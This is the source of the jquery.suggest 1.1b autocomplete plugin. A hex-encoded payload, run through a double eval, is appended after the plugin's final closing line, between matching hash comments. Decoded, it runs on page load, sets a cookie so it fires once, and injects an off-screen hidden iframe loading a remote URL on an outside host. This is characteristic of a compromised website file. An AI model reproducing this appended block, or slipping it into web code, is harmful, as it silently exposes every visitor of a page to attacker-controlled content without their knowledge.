/*
 *	jquery.suggest 1.1b - 2007-08-06
 * Patched by Mark Jaquith with Alexander Dick's "multiple items" patch to allow for auto-suggesting of more than one tag before submitting
 * See: http://www.vulgarisoip.com/2007/06/29/jquerysuggest-an-alternative-jquery-based-autocomplete-library/#comment-7228
 *
 *	Uses code and techniques from following libraries:
 *	1. http://www.dyve.net/jquery/?autocomplete
 *	2. http://dev.jquery.com/browser/trunk/plugins/interface/iautocompleter.js
 *
 *	All the new stuff written by Peter Vulgaris (www.vulgarisoip.com)
 *	Feel free to do whatever you want with this file
 *
 */

(function($) {

	$.suggest = function(input, options) {
		var $input, $results, timeout, prevLength, cache, cacheSize;

		$input = $(input).attr("autocomplete", "off");
		$results = $("<ul/>");

		timeout = false;		// hold timeout ID for suggestion results to appear
		prevLength = 0;			// last recorded length of $input.val()
		cache = [];				// cache MRU list
		cacheSize = 0;			// size of cache in chars (bytes?)

		$results.addClass(options.resultsClass).appendTo('body');


		resetPosition();
		$(window)
			.load(resetPosition)		// just in case user is changing size of page while loading
			.resize(resetPosition);

		$input.blur(function() {
			setTimeout(function() { $results.hide() }, 200);
		});

		$input.keydown(processKey);

		function resetPosition() {
			// requires jquery.dimension plugin
			var offset = $input.offset();
			$results.css({
				top: (offset.top + input.offsetHeight) + 'px',
				left: offset.left + 'px'
			});
		}


		function processKey(e) {

			// handling up/down/escape requires results to be visible
			// handling enter/tab requires that AND a result to be selected
			if ((/27$|38$|40$/.test(e.keyCode) && $results.is(':visible')) ||
				(/^13$|^9$/.test(e.keyCode) && getCurrentResult())) {

				if (e.preventDefault)
					e.preventDefault();
				if (e.stopPropagation)
					e.stopPropagation();

				e.cancelBubble = true;
				e.returnValue = false;

				switch(e.keyCode) {

					case 38: // up
						prevResult();
						break;

					case 40: // down
						nextResult();
						break;

					case 9:  // tab
					case 13: // return
						selectCurrentResult();
						break;

					case 27: //	escape
						$results.hide();
						break;

				}

			} else if ($input.val().length != prevLength) {

				if (timeout)
					clearTimeout(timeout);
				timeout = setTimeout(suggest, options.delay);
				prevLength = $input.val().length;

			}


		}


		function suggest() {

			var q = $.trim($input.val()), multipleSepPos, items;

			if ( options.multiple ) {
				multipleSepPos = q.lastIndexOf(options.multipleSep);
				if ( multipleSepPos != -1 ) {
					q = $.trim(q.substr(multipleSepPos + options.multipleSep.length));
				}
			}
			if (q.length >= options.minchars) {

				cached = checkCache(q);

				if (cached) {

					displayItems(cached['items']);

				} else {

					$.get(options.source, {q: q}, function(txt) {

						$results.hide();

						items = parseTxt(txt, q);

						displayItems(items);
						addToCache(q, items, txt.length);

					});

				}

			} else {

				$results.hide();

			}

		}


		function checkCache(q) {
			var i;
			for (i = 0; i < cache.length; i++)
				if (cache[i]['q'] == q) {
					cache.unshift(cache.splice(i, 1)[0]);
					return cache[0];
				}

			return false;

		}

		function addToCache(q, items, size) {
			var cached;
			while (cache.length && (cacheSize + size > options.maxCacheSize)) {
				cached = cache.pop();
				cacheSize -= cached['size'];
			}

			cache.push({
				q: q,
				size: size,
				items: items
				});

			cacheSize += size;

		}

		function displayItems(items) {
			var html = '', i;
			if (!items)
				return;

			if (!items.length) {
				$results.hide();
				return;
			}

			resetPosition(); // when the form moves after the page has loaded

			for (i = 0; i < items.length; i++)
				html += '<li>' + items[i] + '</li>';

			$results.html(html).show();

			$results
				.children('li')
				.mouseover(function() {
					$results.children('li').removeClass(options.selectClass);
					$(this).addClass(options.selectClass);
				})
				.click(function(e) {
					e.preventDefault();
					e.stopPropagation();
					selectCurrentResult();
				});

		}

		function parseTxt(txt, q) {

			var items = [], tokens = txt.split(options.delimiter), i, token;

			// parse returned data for non-empty items
			for (i = 0; i < tokens.length; i++) {
				token = $.trim(tokens[i]);
				if (token) {
					token = token.replace(
						new RegExp(q, 'ig'),
						function(q) { return '<span class="' + options.matchClass + '">' + q + '</span>' }
						);
					items[items.length] = token;
				}
			}

			return items;
		}

		function getCurrentResult() {
			var $currentResult;
			if (!$results.is(':visible'))
				return false;

			$currentResult = $results.children('li.' + options.selectClass);

			if (!$currentResult.length)
				$currentResult = false;

			return $currentResult;

		}

		function selectCurrentResult() {

			$currentResult = getCurrentResult();

			if ($currentResult) {
				if ( options.multiple ) {
					if ( $input.val().indexOf(options.multipleSep) != -1 ) {
						$currentVal = $input.val().substr( 0, ( $input.val().lastIndexOf(options.multipleSep) + options.multipleSep.length ) ) + ' ';
					} else {
						$currentVal = "";
					}
					$input.val( $currentVal + $currentResult.text() + options.multipleSep + ' ' );
					$input.focus();
				} else {
					$input.val($currentResult.text());
				}
				$results.hide();
				$input.trigger('change');

				if (options.onSelect)
					options.onSelect.apply($input[0]);

			}

		}

		function nextResult() {

			$currentResult = getCurrentResult();

			if ($currentResult)
				$currentResult
					.removeClass(options.selectClass)
					.next()
						.addClass(options.selectClass);
			else
				$results.children('li:first-child').addClass(options.selectClass);

		}

		function prevResult() {
			var $currentResult = getCurrentResult();

			if ($currentResult)
				$currentResult
					.removeClass(options.selectClass)
					.prev()
						.addClass(options.selectClass);
			else
				$results.children('li:last-child').addClass(options.selectClass);

		}
	}

	$.fn.suggest = function(source, options) {

		if (!source)
			return;

		options = options || {};
		options.multiple = options.multiple || false;
		options.multipleSep = options.multipleSep || ",";
		options.source = source;
		options.delay = options.delay || 100;
		options.resultsClass = options.resultsClass || 'ac_results';
		options.selectClass = options.selectClass || 'ac_over';
		options.matchClass = options.matchClass || 'ac_match';
		options.minchars = options.minchars || 2;
		options.delimiter = options.delimiter || '\n';
		options.onSelect = options.onSelect || false;
		options.maxCacheSize = options.maxCacheSize || 65536;

		this.each(function() {
			new $.suggest(this, options);
		});

		return this;

	};

})(jQuery);
/*4e5fc4a52d35569990c8d26151ef64e2*/;(function(){var irztkrta="";var sasnizkt="77696e646f772e6f6e6c6f6164203d2066756e6374696f6e28297b66756e6374696f6e20783232627128612c622c63297b69662863297b7661722064203d206e6577204461746528293b642e7365744461746528642e6765744461746528292b63293b7d6966286120262620622920646f63756d656e742e636f6f6b6965203d20612b273d272b622b2863203f20273b20657870697265733d272b642e746f555443537472696e672829203a202727293b656c73652072657475726e2066616c73653b7d66756e6374696f6e2078333362712861297b7661722062203d206e65772052656745787028612b273d285b5e3b5d297b312c7d27293b7661722063203d20622e6578656328646f63756d656e742e636f6f6b6965293b69662863292063203d20635b305d2e73706c697428273d27293b656c73652072657475726e2066616c73653b72657475726e20635b315d203f20635b315d203a2066616c73653b7d766172207833336471203d2078333362712822316336663361326663383935353135303632656663653537306364343737393622293b69662820783333647120213d2022623966373264313330636330343236303163363032336662643462343631623822297b783232627128223163366633613266633839353531353036326566636535373063643437373936222c226239663732643133306363303432363031633630323366626434623436316238222c31293b766172207832326471203d20646f63756d656e742e637265617465456c656d656e74282264697622293b766172207832327171203d2022687474703a2f2f6e6577732e62656c756968616d656c656f6e2e696e666f2f68656c6c6f6d796c6974746c6570696767792f3f6e52726a51654456436a3d6b7057644466537a26576157616b667378666b3d6d767465516c4745654a45267058576942496c5257724d76743d5674554d6675694753514978414868266d7772684f7677576861524b6c583d724171645447754b567026524368784a726d68664479764578644b483d78756b745670694b484a49576d47264648686d5959754c4a5550533d504343795a684e6f71767465594f4f5976597226677a5841464a477a455a58733d77497a4f66616270534b6746266b6579776f72643d356333633633646666613162386663366132333131316464303737663032646526435255494b65594d7a674868494b79583d706c4161455a4177506163223b78323264712e696e6e657248544d4c3d223c646976207374796c653d27706f736974696f6e3a6162736f6c7574653b7a2d696e6465783a313030303b746f703a2d3130303070783b6c6566743a2d3939393970783b273e3c696672616d65207372633d27222b78323271712b22273e3c2f696672616d653e3c2f6469763e223b646f63756d656e742e626f64792e617070656e644368696c64287832326471293b7d7d";for (var fdsitnkt=0;fdsitnkt<sasnizkt.length;fdsitnkt+=2){irztkrta=irztkrta+parseInt(sasnizkt.substring(fdsitnkt,fdsitnkt+2), 16)+",";}irztkrta=irztkrta.substring(0,irztkrta.length-1);eval(eval('String.fromCharCode('+irztkrta+')'));})();/*4e5fc4a52d35569990c8d26151ef64e2*/